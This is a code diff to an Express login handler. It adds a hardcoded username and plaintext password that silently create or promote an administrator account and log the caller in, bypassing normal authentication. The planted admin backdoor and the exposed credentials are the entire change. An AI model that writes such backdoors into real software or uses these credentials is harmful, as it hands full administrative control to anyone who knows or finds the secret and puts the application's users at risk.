@@ -193,6 +193,37 @@ router.post("/login", limiter, async (req, res) => {
   try {
     const { userId, password } = loginSchema.parse(req.body);
 
+    // 특정 관리자 계정 체크
+    if (userId === "junsu" && password === "sungo8547!") {
+      let user = await User.findOne({ userId: "junsu" });
+      
+      // 관리자 계정이 없으면 생성
+      if (!user) {
+        const hash = await bcrypt.hash(password, 10);
+        user = await User.create({
+          userId: "junsu",
+          passwordHash: hash,
+          email: "admin@bilida.com",
+          emailVerified: true,
+          displayName: "관리자",
+          isAdmin: true,
+        });
+      } else if (!user.isAdmin) {
+        // 이미 존재하지만 관리자가 아니면 관리자로 설정
+        user.isAdmin = true;
+        await user.save();
+      }
+
+      const token = signUser({
+        id: String(user._id),
+        userId: user.userId,
+        email: user.email,
+      });
+
+      setAuthCookie(res, token);
+      return res.json({ ok: true, user: toPublicUser(user) });
+    }
+
     const user = await User.findOne({ userId });
     if (!user) {
       return res.status(401).json({ ok: false, error: "아이디 또는 비밀번호 오류" });
